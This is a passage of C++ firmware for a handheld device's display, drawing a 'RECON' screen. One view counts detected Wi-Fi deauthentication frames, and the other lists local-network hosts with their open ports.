  tft.drawRect(panelX, statsY, panelW, statsH, TFT_DARKGREY);
  tft.fillRect(panelX + 1, statsY + 1, panelW - 2, statsH - 2, 0x0841);

  // STOP/RESET moved slightly down and made same size as BACK.
  const int actionW = btnReconBack.w > 0 ? btnReconBack.w : 78;
  const int actionH = btnReconBack.h > 0 ? btnReconBack.h : UI_BUTTON_H;
  const int actionX = clampi(ActionDockBoxX + ((ActionDockBoxW - actionW) / 2), UI_SAFE_MARGIN, w - UI_SAFE_MARGIN - actionW);
  const int actionYBase = statsY + 10;
  const int ActionDockSafeY = uiActionDockSafeBottom() + 4;
  const int actionY = max(actionYBase, ActionDockSafeY);
  int clearY = actionY + actionH + 3;
  const int clearYMax = panelBottom - actionH;
  if (clearY > clearYMax) clearY = clearYMax;
  btnReconStart = {actionX, actionY, actionW, actionH, reconActive ? "STOP" : "START"};
  btnReconClear = {actionX, clearY, actionW, actionH, "RESET"};
  drawButton(btnReconStart, reconActive ? TFT_RED : TFT_DARKGREEN, TFT_WHITE, TFT_WHITE);
  drawButton(btnReconClear, 0xFD20, TFT_WHITE, TFT_BLACK);

  // Keep BACK below RESET in deauth view and redraw it after action buttons.
  int backY = btnReconClear.y + btnReconClear.h + 3;
  const int modeTop = btnReconModeDeauth.y + buttonRenderYOffset(btnReconModeDeauth);
  const int backYMax = modeTop - btnReconBack.h - 2;
  if (backY > backYMax) backY = backYMax;
  if (backY < 0) backY = 0;
  btnReconBack = {actionX, backY, actionW, actionH, "BACK"};
  drawButton(btnReconBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  const int ctlH = 16;
  const int ctlW = 20;
  const int ctlY = statsY + statsH - ctlH - 4;
  const int lockW = 70;
  const int lockX = panelX + panelW - lockW - 4;
  const int plusX = lockX - ctlW - 4;
  const int minusX = plusX - ctlW - 4;
  btnReconChMinus = {minusX, ctlY, ctlW, ctlH, "-"};
  btnReconChPlus = {plusX, ctlY, ctlW, ctlH, "+"};
  btnReconLock = {lockX, ctlY, lockW, ctlH, reconChannelLock ? "[x] LOCK" : "[ ] LOCK"};

  drawButton(btnReconChMinus, TFT_BLACK, TFT_CYAN, TFT_WHITE);
  drawButton(btnReconChPlus, TFT_BLACK, TFT_CYAN, TFT_WHITE);
  drawButton(btnReconLock,
             reconChannelLock ? 0x03A0 : TFT_BLACK,
             reconChannelLock ? TFT_GREEN : TFT_DARKGREY,
             reconChannelLock ? TFT_WHITE : TFT_CYAN);

  const DeauthStats& stats = DeauthHunter::getStats();
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_CYAN, 0x0841);
  tft.drawString("DEAUTHS:", panelX + 4, statsY + 4);
  tft.drawString("PPS:", panelX + 4, statsY + 18);
  tft.drawString("LAST RSSI:", panelX + 4, statsY + 32);
  tft.drawString("CH:", panelX + 150, statsY + 32);
  tft.setTextColor(TFT_WHITE, 0x0841);
  char deauthStr[16];
  char ppsStr[12];
  char rssiStr[12];
  snprintf(deauthStr, sizeof(deauthStr), "%lu", (unsigned long)stats.total_deauths);
  snprintf(ppsStr, sizeof(ppsStr), "%u", (unsigned)DeauthHunter::getPps());
  snprintf(rssiStr, sizeof(rssiStr), "%d dBm", (int)DeauthHunter::getLastRssi());
  tft.drawString(deauthStr, panelX + 58, statsY + 4);
  tft.drawString(ppsStr, panelX + 30, statsY + 18);
  tft.drawString(rssiStr, panelX + 62, statsY + 32);
  char chStr[16];
  if (reconChannelLock) {
    snprintf(chStr, sizeof(chStr), "L%d", reconSelectedChannel);
  } else {
    snprintf(chStr, sizeof(chStr), "%d", DeauthHunter::getCurrentChannel());
  }
  tft.drawString(chStr, panelX + 170, statsY + 32);

  // Deauth events box moved up and narrowed so right border stays clear of STOP/RESET.
  reconConsoleY = statsY + statsH + 3;
  int eventsRight = statusRight;
  if (eventsRight < (panelX + 120)) eventsRight = panelX + 120;
  const int eventsW = eventsRight - panelX;
  reconConsoleX = panelX;
  reconConsoleW = eventsW;
  reconConsoleH = panelBottom - reconConsoleY;
  if (reconConsoleH < 36) reconConsoleH = 36;
  tft.drawRect(panelX, reconConsoleY, eventsW, reconConsoleH, TFT_DARKGREY);
  tft.fillRect(panelX + 1, reconConsoleY + 1, eventsW - 2, reconConsoleH - 2, TFT_BLACK);
  tft.fillRect(panelX + 1, reconConsoleY + 1, eventsW - 2, 12, TFT_BLACK);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString("DEAUTH EVENTS", panelX + 4, reconConsoleY + 4);
  tft.setTextDatum(TR_DATUM);
  tft.setTextColor(reconActive ? TFT_GREEN : TFT_RED, TFT_BLACK);
  tft.drawString(reconActive ? "[HUNTING]" : "[STOPPED]", panelX + eventsW - 4, reconConsoleY + 4);
  tft.setTextDatum(TL_DATUM);
  drawReconConsole(true);
}

static void drawReconPortPanel(int panelTop, int panelBottom) {
  const int w = tft.width();
  const int panelX = UI_SAFE_MARGIN;
  const int panelW = w - (UI_SAFE_MARGIN * 2);
  const int topH = 46;

  tft.drawRect(panelX, panelTop, panelW, topH, TFT_DARKGREY);
  tft.fillRect(panelX + 1, panelTop + 1, panelW - 2, topH - 2, 0x0024);

  const bool wifiOk = wifiStaHasValidIp();
  btnReconPortStartStop = {panelX + panelW - 132, panelTop + 4, 62, 18,
                           reconScanner.isRunning() ? "STOP" : "START"};
  btnReconPortExport = {panelX + panelW - 66, panelTop + 4, 62, 18, "EXPORT"};
  drawButton(btnReconPortStartStop,
             wifiOk ? (reconScanner.isRunning() ? TFT_RED : TFT_DARKGREEN) : TFT_DARKGREY,
             TFT_WHITE,
             TFT_WHITE);
  drawButton(btnReconPortExport, TFT_NAVY, TFT_CYAN, TFT_WHITE);

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_CYAN, 0x0024);
  if (wifiOk) {
    char subnetBuf[24];
    subnetBuf[0] = '\0';
    if (reconScanner.subnetLabel()[0] != '\0') {
      snprintf(subnetBuf, sizeof(subnetBuf), "%s", reconScanner.subnetLabel());
    } else {
      IPAddress ip = WiFi.localIP();
      IPAddress mask = WiFi.subnetMask();
      IPAddress net((uint8_t)(ip[0] & mask[0]),
                    (uint8_t)(ip[1] & mask[1]),
                    (uint8_t)(ip[2] & mask[2]),
                    (uint8_t)(ip[3] & mask[3]));
      const uint32_t maskU32 = reconIpv4ToU32(mask[0], mask[1], mask[2], mask[3]);
      const uint8_t prefix = reconPrefixLengthFromMaskU32(maskU32);
      snprintf(subnetBuf, sizeof(subnetBuf), "%u.%u.%u.%u/%u",
               net[0], net[1], net[2], net[3], prefix);
    }
    char subnetLine[64];
    snprintf(subnetLine, sizeof(subnetLine), "Subnet %s", subnetBuf);
    tft.drawString(subnetLine, panelX + 4, panelTop + 4);
    char stateLine[64];
    snprintf(stateLine, sizeof(stateLine), "%s %u%%  Hosts:%u",
             reconScanStateLabel(reconScanner.state()),
             (unsigned)reconScanner.progressPct(),
             (unsigned)reconScanner.hostCount());
    tft.drawString(stateLine, panelX + 4, panelTop + 18);
  } else {
    tft.setTextColor(TFT_ORANGE, 0x0024);
    tft.drawString("Port scanner requires WiFi STA connection", panelX + 4, panelTop + 10);
  }

  const int barX = panelX + 4;
  const int barY = panelTop + topH - 10;
  const int barW = panelW - 8;
  const int pct = reconScanner.progressPct();
  tft.drawRect(barX, barY, barW, 6, TFT_DARKGREY);
  tft.fillRect(barX + 1, barY + 1, ((barW - 2) * pct) / 100, 4, TFT_GREEN);

  const int listY = panelTop + topH + 4;
  const int portsH = 40;
  const int listH = panelBottom - listY - portsH - 2;
  reconHostRowH = 12;
  reconHostListRect = {panelX, listY, panelW - 24, max(24, listH)};
  tft.drawRect(reconHostListRect.x, reconHostListRect.y, reconHostListRect.w, reconHostListRect.h, TFT_DARKGREY);
  tft.fillRect(reconHostListRect.x + 1, reconHostListRect.y + 1, reconHostListRect.w - 2, reconHostListRect.h - 2, TFT_BLACK);

  btnReconPortUp = {panelX + panelW - 22, listY, 20, 18, "^"};
  btnReconPortDown = {panelX + panelW - 22, listY + 22, 20, 18, "v"};
  drawButton(btnReconPortUp, TFT_BLACK, TFT_CYAN, TFT_WHITE);
  drawButton(btnReconPortDown, TFT_BLACK, TFT_CYAN, TFT_WHITE);

  const int rows = reconHostListRect.h / reconHostRowH;
  const int hostCount = reconScanner.hostCount();
  if (reconPortScroll > 0 && reconPortScroll >= hostCount) {
    reconPortScroll = (hostCount > 0) ? (hostCount - 1) : 0;
  }
  for (int row = 0; row < rows; ++row) {
    const int idx = reconPortScroll + row;
    if (idx >= hostCount) break;
    const ReconHostRecord* host = reconScanner.hostAt((uint8_t)idx);
    if (!host) continue;
    const bool selected = (idx == reconHostSelected);
    const int y = reconHostListRect.y + 2 + (row * reconHostRowH);
    if (selected) {
      tft.fillRect(reconHostListRect.x + 1, y - 1, reconHostListRect.w - 2, reconHostRowH, 0x03A0);
    }

    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             host->mac[0], host->mac[1], host->mac[2], host->mac[3], host->mac[4], host->mac[5]);
    char line[84];
    snprintf(line, sizeof(line), "%s %s %s",
             host->ip.toString().c_str(),
             mac,
             host->vendor);
    tft.setTextColor(selected ? TFT_BLACK : TFT_CYAN, selected ? 0x03A0 : TFT_BLACK);
    tft.drawString(line, reconHostListRect.x + 3, y);
  }

  const int portsY = listY + reconHostListRect.h + 4;
  tft.drawRect(panelX, portsY, panelW, portsH, TFT_DARKGREY);
  tft.fillRect(panelX + 1, portsY + 1, panelW - 2, portsH - 2, TFT_BLACK);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString("Selected Host Ports", panelX + 4, portsY + 3);
  if (reconHostSelected >= 0 && reconHostSelected < hostCount) {
    const ReconHostRecord* host = reconScanner.hostAt((uint8_t)reconHostSelected);
    if (host) {
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      char hostMeta[96];
      snprintf(hostMeta, sizeof(hostMeta), "%s  %s  RTT:%ums",
               host->ip.toString().c_str(), host->osGuess, (unsigned)host->rttMs);
      tft.drawString(hostMeta, panelX + 4, portsY + 14);

      char portsLine[120];
      portsLine[0] = '\0';
      for (uint8_t i = 0; i < host->openCount; ++i) {
        char token[24];
        snprintf(token, sizeof(token), "%u/%s%s",
                 (unsigned)host->open[i].port,
                 host->open[i].service ? host->open[i].service : "UNK",
                 (i + 1U < host->openCount) ? " " : "");
        if ((strlen(portsLine) + strlen(token) + 1) < sizeof(portsLine)) strcat(portsLine, token);
      }
      if (host->openCount == 0) snprintf(portsLine, sizeof(portsLine), "No open ports in default set");
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.drawString(portsLine, panelX + 4, portsY + 26);
    }
  } else {
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawString("Tap a host above to inspect open services", panelX + 4, portsY + 18);
  }
}

// Draw Recon screen with two subviews.
static void drawRecon() {
  const int w = tft.width();
  const int h = tft.height();
  const uint8_t hunterFilter = DeauthHunter::getChannelFilter();
  reconChannelLock = (hunterFilter >= 1 && hunterFilter <= 13);
  if (reconChannelLock) {
    reconSelectedChannel = hunterFilter;
  } else {
    const uint8_t chNow = DeauthHunter::getCurrentChannel();
    if (chNow >= 1 && chNow <= 13) reconSelectedChannel = chNow;
  }

  tft.fillScreen(TFT_BLACK);
  drawHeader("RECON");
  drawUniversalBackground();

  // Mode buttons moved to bottom row.
  const int modeY = h - UI_BUTTON_H - 2;
  const int modeGap = 6;
  const int modeW = (w - (UI_SAFE_MARGIN * 2) - modeGap) / 2;
  btnReconModeDeauth = {UI_SAFE_MARGIN, modeY, modeW, UI_BUTTON_H, "DEAUTH-HUNTER"};
  btnReconModePort = {UI_SAFE_MARGIN + modeW + modeGap, modeY, modeW, UI_BUTTON_H, "PORT SCANNER"};
  layoutReconBackButtonUnderActionDock(modeY + buttonRenderYOffset(btnReconModeDeauth), UI_BUTTON_H);

  drawButton(btnReconModeDeauth,
             reconView == ReconView::DEAUTH ? TFT_DARKGREEN : TFT_BLACK,
             TFT_CYAN,
             TFT_WHITE);
  drawButton(btnReconModePort,
             reconView == ReconView::PORT_SCAN ? TFT_DARKGREEN : TFT_BLACK,
             TFT_CYAN,
             TFT_WHITE);
  drawButton(btnReconBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  // Status box starts 5px below top header text band.
  const int panelTop = uiHeaderBandH() + 5;
  // Keep content panels 5px above the status text band drawn at (modeY - 10).
  // Status band occupies ~10px height, so reserve until (modeY - 15).
  const int panelBottom = modeY - 15;

  if (reconView == ReconView::DEAUTH) {
    drawReconDeauthPanel(panelTop, panelBottom);
  } else {
    drawReconPortPanel(panelTop, panelBottom);
  }

  if (!reconStatusLine.isEmpty()) {
    const int statusY = modeY - 10;
    tft.fillRect(UI_SAFE_MARGIN, statusY - 2, w - (UI_SAFE_MARGIN * 2), 10, TFT_BLACK);
    applyFontSm();
    tft.setTextDatum(TL_DATUM);
    tft.setTextColor(TFT_ORANGE, TFT_BLACK);
    tft.drawString(reconStatusLine, UI_SAFE_MARGIN + 2, statusY);
  }

  drawBorder();
  reconLayoutDrawn = true;
}

// ---------- Port Scanner Screen - Option B Split Panel (320x240) ----------
static UiRect psHostsRect{};
static UiRect psTargetRect{};
static UiRect psOpenRect{};
static UiRect psEventsRect{};
static UiRect psStatusRect{};
static UiRect psRateRect{};
static UiRect psHeaderRect{};
static UiRect psButtonsRect{};
static UiPanel psHostsPanel{};
static UiPanel psTargetPanel{};
static UiPanel psEventsPanel{};
static UiPanel psStatusPanel{};
static UiPanel psRatePanel{};
static UiPanel psHeaderMetaPanel{};
static constexpr int PS_HOST_ROWS_VISIBLE = 6;
static int16_t psEventScroll = 0;
static bool psEventAutoScroll = true;
static constexpr uint8_t PS_MAX_DIRTY_RECTS = 20;
static UiRect psDirtyRects[PS_MAX_DIRTY_RECTS];
static uint8_t psDirtyCount = 0;

enum PsDirtyRegion : uint16_t {
  PS_DIRTY_NONE    = 0,
  PS_DIRTY_HEADER  = 1 << 0,
  PS_DIRTY_HOSTS   = 1 << 1,
  PS_DIRTY_TARGET  = 1 << 2,
  PS_DIRTY_EVENTS  = 1 << 3,
  PS_DIRTY_STATUS  = 1 << 4,
  PS_DIRTY_RATE    = 1 << 5,
  PS_DIRTY_BUTTONS = 1 << 6,
  PS_DIRTY_ALL_DYNAMIC = PS_DIRTY_HEADER | PS_DIRTY_HOSTS | PS_DIRTY_TARGET | PS_DIRTY_EVENTS | PS_DIRTY_STATUS | PS_DIRTY_RATE | PS_DIRTY_BUTTONS
};

static UiRect psClampRectToScreen(const UiRect& r) {
  UiRect out = r;
  const int sw = tft.width();
  const int sh = tft.height();
  if (out.x < 0) { out.w += out.x; out.x = 0; }
  if (out.y < 0) { out.h += out.y; out.y = 0; }
  if (out.x + out.w > sw) out.w = sw - out.x;
  if (out.y + out.h > sh) out.h = sh - out.y;
  if (out.w < 0) out.w = 0;
  if (out.h < 0) out.h = 0;
  return out;
}

static bool psRectsTouchOrOverlap(const UiRect& a, const UiRect& b) {
  return !(a.x + a.w < b.x || b.x + b.w < a.x || a.y + a.h < b.y || b.y + b.h < a.y);
}

static void invalidateRect(const UiRect& in) {
  UiRect r = psClampRectToScreen(in);
  if (r.w <= 0 || r.h <= 0) return;
  for (uint8_t i = 0; i < psDirtyCount; ++i) {
    UiRect& cur = psDirtyRects[i];
    if (!psRectsTouchOrOverlap(cur, r)) continue;
    const int x0 = min(cur.x, r.x);
    const int y0 = min(cur.y, r.y);
    const int x1 = max(cur.x + cur.w, r.x + r.w);
    const int y1 = max(cur.y + cur.h, r.y + r.h);
    cur = UiRect{x0, y0, x1 - x0, y1 - y0};
    return;
  }
  if (psDirtyCount < PS_MAX_DIRTY_RECTS) {
    psDirtyRects[psDirtyCount++] = r;
  } else {
    psDirtyRects[0] = UiRect{0, 0, tft.width(), tft.height()};
    psDirtyCount = 1;
  }
}

static void psInvalidatePanel(const UiPanel& panel) {
  invalidateRect(panel.frameRect);
}

static void psComputeLayout() {
  const int w = tft.width();
  const int h = tft.height();
  const int hdrH = 52;
  const int bottomY = 266;
  psHeaderRect = UiRect{0, 0, w, hdrH};
  psHostsRect  = UiRect{6, 58, 124, 202};
  psStatusRect = UiRect{378, 58, 96, 90};
  psRateRect   = UiRect{378, 154, 96, 40};
  psTargetRect = UiRect{136, 58, 236, 138};
  psOpenRect   = UiRect{0, 0, 0, 0};
  psEventsRect = UiRect{136, 196, 338, 64};
  psButtonsRect = UiRect{5, bottomY + 2, w - 10, h - (bottomY + 2) - 3};

  psHostsPanel  = uiMakePanel(psHostsRect, 3, 14, 8, 2);
  psTargetPanel = uiMakePanel(psTargetRect, 4, 14, 4, 4);
  psEventsPanel = uiMakePanel(psEventsRect, 2, 12, 6, 2);
  psStatusPanel = uiMakePanel(psStatusRect, 2, 14, 2, 2);
  psRatePanel   = uiMakePanel(psRateRect, 2, 14, 2, 2);
  psHeaderMetaPanel = uiMakePanel(psHeaderRect, 8, 38, 62, 2);
}

static void psDrawNeonPanel(int x, int y, int w, int h, uint16_t border, const char* title) {
  tft.drawRoundRect(x, y, w, h, 6, border);
  tft.drawRoundRect(x + 2, y + 2, w - 4, h - 4, 5, tft.color565(16, 28, 36));
  if (title && title[0] != '\0') {
    tft.fillRect(x + 8, y - 1, min(w - 16, 160), 11, TFT_BLACK);
    tft.setTextDatum(TL_DATUM);
    applyFontSm();
    tft.setTextColor(border, TFT_BLACK);
    tft.drawString(title, x + 10, y + 2);
  }
}

static void psDrawHostStatusDot(const ReconHostRecord& h, int x, int y) {
  uint16_t col = TFT_GREEN;
  bool risky = false;
  for (uint8_t i = 0; i < h.openCount; ++i) {
    const uint16_t p = h.open[i].port;
    if (p == 23 || p == 3389 || p == 5900 || p == 445) risky = true;
  }
  if (risky) col = TFT_RED;
  else if (h.openCount == 0) col = TFT_YELLOW;
  tft.fillCircle(x, y, 3, col);
}

static void psDrawProgressRing(int cx, int cy, int rOuter, int pct) {
  const int rInner = rOuter - 5;
  for (int a = 0; a < 360; a += 12) {
    const float rad = (float)a * 0.0174532925f;
    const int x0 = cx + (int)(cosf(rad) * rInner);
    const int y0 = cy + (int)(sinf(rad) * rInner);
    const int x1 = cx + (int)(cosf(rad) * rOuter);
    const int y1 = cy + (int)(sinf(rad) * rOuter);
    const bool lit = a <= ((pct * 360) / 100);
    tft.drawLine(x0, y0, x1, y1, lit ? TFT_CYAN : tft.color565(18, 24, 28));
  }
}

static void psDrawTinySparkline(const UiRect& r) {
  const int n = portScanner.rateSampleCount();
  if (n < 2) return;
  uint16_t vmax = 1;
  for (int i = 0; i < n; ++i) vmax = max(vmax, portScanner.rateSampleAt(i));
  const int plotX = r.x + 3;
  const int plotY = r.y + 16;
  const int plotW = r.w - 10;
  const int plotH = r.h - 20;
  if (plotW < 8 || plotH < 8) return;
  tft.fillRect(plotX, plotY, plotW, plotH, TFT_BLACK);
  #if defined(NEONDRIVE_USES_M5GFX)
  tft.setClipRect(plotX, plotY, plotW, plotH);
  #else
  tft.setViewport(plotX, plotY, plotW, plotH);
  #endif
  int px = 0;
  int py = plotH - 1;
  for (int i = 0; i < n; ++i) {
    const int x = (i * (plotW - 1)) / max(1, n - 1);
    const int y = (plotH - 1) - ((int)portScanner.rateSampleAt(i) * (plotH - 1) / vmax);
    if (i > 0) tft.drawLine(px, py, x, y, TFT_CYAN);
    px = x; py = y;
  }
  #if defined(NEONDRIVE_USES_M5GFX)
  tft.clearClipRect();
  #else
  tft.resetViewport();
  #endif
}

static const char* psEventTypeLabel(ReconEventType t) {
  switch (t) {
    case ReconEventType::INFO: return "INFO";
    case ReconEventType::DISCOVERED: return "DISCOVERED";
    case ReconEventType::PROBE: return "PROBE";
    case ReconEventType::OPEN: return "OPEN";
    case ReconEventType::TIMEOUT: return "TIMEOUT";
    case ReconEventType::RETRY: return "RETRY";
    case ReconEventType::DONE: return "DONE";
    case ReconEventType::ERROR: return "ERROR";
    default: return "EVT";
  }
}

static uint16_t psEventTypeColor(ReconEventType t) {
  switch (t) {
    case ReconEventType::INFO: return TFT_CYAN;
    case ReconEventType::DISCOVERED: return TFT_GREEN;
    case ReconEventType::OPEN: return TFT_GREEN;
    case ReconEventType::TIMEOUT: return TFT_YELLOW;
    case ReconEventType::RETRY: return TFT_MAGENTA;
    case ReconEventType::ERROR: return TFT_RED;
    case ReconEventType::DONE: return 0x07FF;
    default: return TFT_WHITE;
  }
}

static void psSaveToSD() {
  String ssid  = WiFi.SSID();
  String bssid = WiFi.BSSIDstr();
  ssid.replace("/","_"); ssid.replace(" ","_");
  bssid.replace(":","");
  String dir  = String("/captures/") + ssid + "_" + bssid;
  String path = dir + "/portscan_" + String(millis()) + ".csv";
  bool saved = false;
  if (sdReady) {
    SD.mkdir(dir.c_str());
    File f = SD.open(path.c_str(), FILE_WRITE);
    if (f) { portScanner.exportCsv(f); f.close(); saved = true; }
  }
  if (!saved) portScanner.exportCsv(LittleFS, "/recon_scan.csv");
}

static void psDrawHeaderStatic() {
  const int w = tft.width();
  const int hdrH = psHeaderRect.h;
  tft.fillRect(0, 0, w, hdrH, TFT_BLACK);
  tft.drawFastHLine(0, hdrH - 1, w, tft.color565(20, 28, 32));
  tft.setTextDatum(TL_DATUM);
  applyFontMd();
  tft.setTextColor(TFT_RED, TFT_BLACK);
  tft.drawString("NET SCAN", 34, 6);
  tft.drawCircle(16, 16, 8, TFT_GREEN);
  tft.drawCircle(16, 16, 2, TFT_GREEN);
  tft.drawFastHLine(8, 16, 16, TFT_GREEN);
  tft.drawFastVLine(16, 8, 16, TFT_GREEN);
  layoutActionDockBox();
  const int cubeBoxX = w - 58;
  const int cubeBoxY = 2;
  tft.drawRoundRect(cubeBoxX, cubeBoxY, 54, 54, 6, TFT_GREEN);
  tft.drawRoundRect(cubeBoxX + 2, cubeBoxY + 2, 50, 50, 4, tft.color565(20, 40, 20));
}

static void psDrawHeaderDynamic() {
  const int w = tft.width();
  const char* modeLabel = psDeepScanEnabled ? "DEEP" : "FAST";
  const int modeX = 216;
  const int cubeBoxX = w - 58;
  tft.fillRect(modeX, 2, cubeBoxX - modeX - 4, 48, TFT_BLACK);
  tft.fillRect(8, 32, cubeBoxX - 16, 16, TFT_BLACK);
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  applyFontSm();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("MODE", modeX, 6);
  btnPSDeep = {modeX + 38, 4, 72, 18, modeLabel};
  drawButton(btnPSDeep, tft.color565(0, 30, 0), TFT_GREEN, TFT_WHITE);

  char scanMeta[160];
  snprintf(scanMeta, sizeof(scanMeta), "RANGE:%s  PROFILE:%s  PORTS:SMART-%u  TIMEOUT:%ums  ENGINE:LOCAL",
           portScanner.subnetLabel()[0] ? portScanner.subnetLabel() : "-",
           portScanner.profileLabel()[0] ? portScanner.profileLabel() : (psDeepScanEnabled ? "SMART-DEEP" : "SMART-FAST"),
           (unsigned)portScanner.portCount(),
           (unsigned)portScanner.timeoutMs());
  beginPanelContent(psHeaderMetaPanel);
  tft.fillRect(0, 0, psHeaderMetaPanel.contentRect.w, psHeaderMetaPanel.contentRect.h, TFT_BLACK);
  drawTextClipped(String(scanMeta), 0, 0, psHeaderMetaPanel.contentRect.w, TFT_LIGHTGREY, TFT_BLACK, true);
  endPanelContent();
}

static void psDrawLayoutStatic() {
  psDrawNeonPanel(psHostsRect.x, psHostsRect.y, psHostsRect.w, psHostsRect.h, TFT_GREEN, "DISCOVERED HOSTS");
  psDrawNeonPanel(psTargetRect.x, psTargetRect.y, psTargetRect.w, psTargetRect.h, TFT_CYAN, "TARGET DETAILS + OPEN PORTS");
  psDrawNeonPanel(psEventsRect.x, psEventsRect.y, psEventsRect.w, psEventsRect.h, TFT_GREEN, "LIVE EVENTS");
  psDrawNeonPanel(psStatusRect.x, psStatusRect.y, psStatusRect.w, psStatusRect.h, TFT_CYAN, "SCAN STATUS");
  psDrawNeonPanel(psRateRect.x, psRateRect.y, psRateRect.w, psRateRect.h, TFT_CYAN, "RESPONSE RATE");
}

static void psDrawHostsDynamic() {
  const uint8_t total = portScanner.hostCount();
  const int maxScroll = max(0, (int)total - PS_HOST_ROWS_VISIBLE);
  if ((int)psScrollOffset > maxScroll) psScrollOffset = (uint8_t)maxScroll;
  const int hostRowH = (psHostsRect.h - 24) / PS_HOST_ROWS_VISIBLE;
  beginPanelContent(psHostsPanel);
  tft.fillRect(0, 0, psHostsPanel.contentRect.w, psHostsPanel.contentRect.h, TFT_BLACK);
  for (int r = 0; r < PS_HOST_ROWS_VISIBLE; ++r) {
    const int idx = psScrollOffset + r;
    if (idx >= total) break;
    const ReconHostRecord* hrec = portScanner.hostAt((uint8_t)idx);
    if (!hrec) break;
    const int ry = 2 + r * hostRowH;
    const bool sel = (idx == psSelectedRow);
    const uint16_t rowBg = sel ? tft.color565(28, 44, 10) : TFT_BLACK;
    tft.fillRect(1, ry, psHostsPanel.contentRect.w - 8, hostRowH - 2, rowBg);
    psDrawHostStatusDot(*hrec, 7, ry + 8);
    tft.setTextDatum(TL_DATUM);
    applyFontSm();
    drawTextClipped(hrec->ip.toString(), 15, ry + 2, psHostsPanel.contentRect.w - 24, sel ? TFT_WHITE : 0x87E0, rowBg, false);
    char macBuf[20];
    snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
             hrec->mac[0], hrec->mac[1], hrec->mac[2], hrec->mac[3], hrec->mac[4], hrec->mac[5]);
    drawTextClipped(String(macBuf), 15, ry + 12, psHostsPanel.contentRect.w - 24, TFT_DARKGREY, rowBg, false);
  }
  endPanelContent();
  if (total > PS_HOST_ROWS_VISIBLE) {
    const int trackY = psHostsRect.y + 16;
    const int trackH = psHostsRect.h - 30;
    tft.fillRect(psHostsRect.x + psHostsRect.w - 7, trackY, 5, trackH, tft.color565(10, 20, 10));
    const int knobH = max(12, (trackH * PS_HOST_ROWS_VISIBLE) / total);
    const int knobY = trackY + ((trackH - knobH) * psScrollOffset) / max(1, (int)total - PS_HOST_ROWS_VISIBLE);
    tft.fillRect(psHostsRect.x + psHostsRect.w - 7, knobY, 5, knobH, TFT_GREEN);
  } else {
    tft.fillRect(psHostsRect.x + psHostsRect.w - 7, psHostsRect.y + 16, 5, psHostsRect.h - 30, TFT_BLACK);
  }
  btnPSScrollUp = {psHostsRect.x + psHostsRect.w - 12, psHostsRect.y + psHostsRect.h - 20, 10, 8, "^"};
  btnPSScrollDown = {psHostsRect.x + psHostsRect.w - 12, psHostsRect.y + psHostsRect.h - 10, 10, 8, "v"};
}

static void psDrawTargetDynamic() {
  const ReconHostRecord* selHost = (psSelectedRow >= 0) ? portScanner.hostAt((uint8_t)psSelectedRow) : nullptr;
  beginPanelContent(psTargetPanel);
  tft.fillRect(0, 0, psTargetPanel.contentRect.w, psTargetPanel.contentRect.h, TFT_BLACK);
  if (selHost) {
    const int tx = 10;
    applyFontMd();
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    drawTextClipped(selHost->ip.toString(), tx + 8, 0, psTargetPanel.contentRect.w - tx - 10, TFT_GREEN, TFT_BLACK, false);
    applyFontSm();
    char macBuf[20];
    snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
             selHost->mac[0], selHost->mac[1], selHost->mac[2], selHost->mac[3], selHost->mac[4], selHost->mac[5]);
    const char* labels[] = {"HOST", "MAC", "VENDOR", "OS", "RTT"};
    const char* values[] = {
      selHost->hostname[0] ? selHost->hostname : "-",
      macBuf,
      selHost->vendor[0] ? selHost->vendor : "Unknown",
      selHost->osGuess[0] ? selHost->osGuess : "Unknown",
      nullptr
    };
    char rttBuf[16];
    snprintf(rttBuf, sizeof(rttBuf), "%ums", (unsigned)selHost->rttMs);
    const int rowY0 = 28;
    for (int i = 0; i < 5; ++i) {
      drawTextClipped(String(labels[i]), tx, rowY0 + (i * 9), 46, TFT_LIGHTGREY, TFT_BLACK, false);
      drawTextClipped(String((i == 4) ? rttBuf : values[i]), tx + 52, rowY0 + (i * 9), psTargetPanel.contentRect.w - (tx + 52) - 4, TFT_WHITE, TFT_BLACK, false);
    }
    drawTextClipped("OPEN PORTS", tx, 78, psTargetPanel.contentRect.w - tx - 4, TFT_CYAN, TFT_BLACK, false);
    int chipX = tx;
    int chipY = 90;
    uint8_t openShown = 0;
    for (uint8_t i = 0; i < selHost->openCount && i < 8; ++i) {
      const uint16_t p = selHost->open[i].port;
      const char* svc = selHost->open[i].service ? selHost->open[i].service : "Unknown";
      uint16_t bcol = TFT_GREEN;
      if (p == 445 || p == 139 || p == 3389 || p == 23 || p == 5900) bcol = TFT_RED;
      else if (p == 135 || p == 21) bcol = TFT_YELLOW;
      char buf[22];
      snprintf(buf, sizeof(buf), "%u %s", (unsigned)p, svc);
      const int bw = tft.textWidth(buf) + 8;
      if (chipX + bw > psTargetPanel.contentRect.w - 6) {
        chipX = tx;
        chipY += 14;
      }
      if (chipY > psTargetPanel.contentRect.h - 14) break;
      tft.drawRoundRect(chipX, chipY, bw, 12, 3, bcol);
      drawTextClipped(String(buf), chipX + 4, chipY + 2, bw - 8, bcol, TFT_BLACK, false);
      chipX += bw + 6;
      openShown++;
    }
    if (openShown == 0) {
      drawTextClipped("NO OPEN PORTS", tx, 94, psTargetPanel.contentRect.w - tx - 4, TFT_DARKGREY, TFT_BLACK, false);
    }
  } else {
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("NO HOST SELECTED", psTargetPanel.contentRect.w / 2, psTargetPanel.contentRect.h / 2);
    tft.setTextDatum(TL_DATUM);
  }
  endPanelContent();
}

